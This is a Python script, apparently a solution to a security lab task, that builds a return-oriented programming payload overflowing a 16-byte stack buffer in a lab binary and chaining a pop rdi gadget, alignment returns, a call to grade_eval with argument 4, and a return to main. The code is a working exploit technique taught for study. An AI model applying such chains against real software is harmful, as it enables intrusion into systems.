#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx (NX + ASLR, non-PIE).

Idea:
  * input()'s return address is overwritten with an unaligned but valid
    "pop rdi; ret" gadget at 0x401a33 (inside __libc_csu_init).
  * The chain sets edi = 4, returns through a bare `ret` for 16-byte
    alignment, calls grade_eval (0x401978), then returns to main().
  * main() reads EOF, prints the answer and exits normally.

Gadgets are all inside the lab's suggested 0x4019d0..0x401ae3 range.
The report also discusses the classic ret2csu variant (0x401a2a /
0x401a10), which reaches the same goal with a longer chain.
"""
import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


payload = b"A" * 24                         # 16-byte buffer + 8-byte saved rbp
payload += p64(0x401A33)                    # pop rdi; ret
payload += p64(4)                           # edi = 4
payload += p64(0x401A40)                    # ret (16-byte stack alignment)
payload += p64(0x401978)                    # grade_eval
payload += p64(0x401A40)                    # ret (alignment)
payload += p64(0x4019B4)                    # main -> EOF -> answer, exit(0)
payload += b"\n"

sys.stdout.buffer.write(payload)
